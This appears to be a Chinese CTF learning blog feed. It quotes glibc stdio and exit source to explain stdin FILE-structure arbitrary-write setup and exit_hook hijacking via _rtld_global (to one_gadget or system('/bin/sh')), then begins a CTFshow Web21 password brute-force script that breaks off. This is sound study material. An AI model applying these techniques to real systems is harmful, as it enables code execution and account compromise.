class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><p>上面的源码做了下面这些事情</p><ol><li>判断缓冲区是否为空，若为空，调用 <em>IO_doallocbuf</em> 来初始化缓冲区，若是初始化缓冲区了那我不是直接g了，所以我们不能让他初始化</li><li>have来判断缓冲区是否有数据，如果有数据就把他给输出区域，很显然我们是不想让这样子的，这里我们一般构建 <code>fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr</code></li><li>当缓冲区不能满足需求时候，就会进入 <code>__underflow</code> 函数来读取数据</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里做了下面几件事</p><ol><li>判断 <code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code> 是否成立</li><li>判断 <code>_flag</code> 是否包括 <code>_IO_NO_READS</code> 这个在宏定义中值为4，所以我们不能包含4</li><li>最终调用 <code>_IO_SYSREAD</code> 来进行输出。因此要想利用 <code>stdin</code> 输入缓冲区需设置FILE结构体中 <code>_IO_buf_base</code> 为 <code>write_start</code> ， <code>_IO_buf_end</code>为<code>write_end</code> 。同时也需将结构体中的<code>fp-&gt;_fileno</code>设置为0，最终调用 <code>read (fp-&gt;_fileno, buf, size))</code> 读取数据。</li></ol><p>所以，为了完成stdin任意地址写，我们要做下面的事情</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置_IO_read_end等于_IO_read_ptr。</span></span><br><span class="line"><span class="comment">#设置_flag &amp;~ _IO_NO_READS即_flag &amp;~ 0x4。</span></span><br><span class="line"><span class="comment">#设置_fileno为0。</span></span><br><span class="line"><span class="comment">#设置_IO_buf_base为write_start，_IO_buf_end为write_end；且使得_IO_buf_end-_IO_buf_base大于fread要读的数据。</span></span><br></pre></td></tr></table></figure><h4 id="劫持exit-hook"><a href="#劫持exit-hook" class="headerlink" title="劫持exit_hook"></a>劫持exit_hook</h4><p>严格来说，exit并不存在hook，这是一种类似于指针劫持的方法</p><p>我们继续看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>glibc特有的shit堆在shit上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line">      arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      onfct (status, arg);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      atfct ();</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">      arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      cxafct (arg, status);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一些关键的跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line"><span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line"><span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"><span class="type">void</span> *arg;</span><br></pre></td></tr></table></figure><p>跟踪发现，调用dl_fini</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现两个关键的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure><p>存在  <strong><em>_rtld_global</em></strong> 结构体</p><p>通过gdb <strong>p _rtld_global</strong></p><p><img src="/../images/20200413122505426.jpg" alt="在这里插入图片描述"></p><p>如上，我们只需要劫持 _rtld_global 结构体中的 <code>__rtld_lock_lock_recursive (GL(dl_load_lock));</code> <code>__rtld_lock_unlock_recursive (GL(dl_load_lock));</code></p><p>即可，这里需要调整一下偏移</p><h5 id="总结exit调用流程"><a href="#总结exit调用流程" class="headerlink" title="总结exit调用流程"></a>总结exit调用流程</h5><p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p><p>同时，最后的函数在调用前会给rdi赋值，可以直接修改函数为 onegadget或者修改函数和其参数，也就是 <code>rtld_lock_default_unlock_recursive</code> 函数为 <code>system</code> ，并且改把  <code>_rtld_global._dl_load_lock.mutex的值改为 /bin/sh\x00 </code></p>]]></content>
      
      
      <categories>
          
          <category> glibc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> glibcLearning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowWeb</title>
      <link href="/2023/08/18/ctfshowWeb/"/>
      <url>/2023/08/18/ctfshowWeb/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-Web"><a href="#CTFshow-Web" class="headerlink" title="CTFshow_Web"></a>CTFshow_Web</h1><h2 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h2><p>给了字典，爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6eb81b5b-7de0-4815-98e2-28baa559b050.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取字典</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\Lenovo\\Desktop\\_python\\ctfshow_Web\\web21\\pwd.txt&quot;</span>,<span 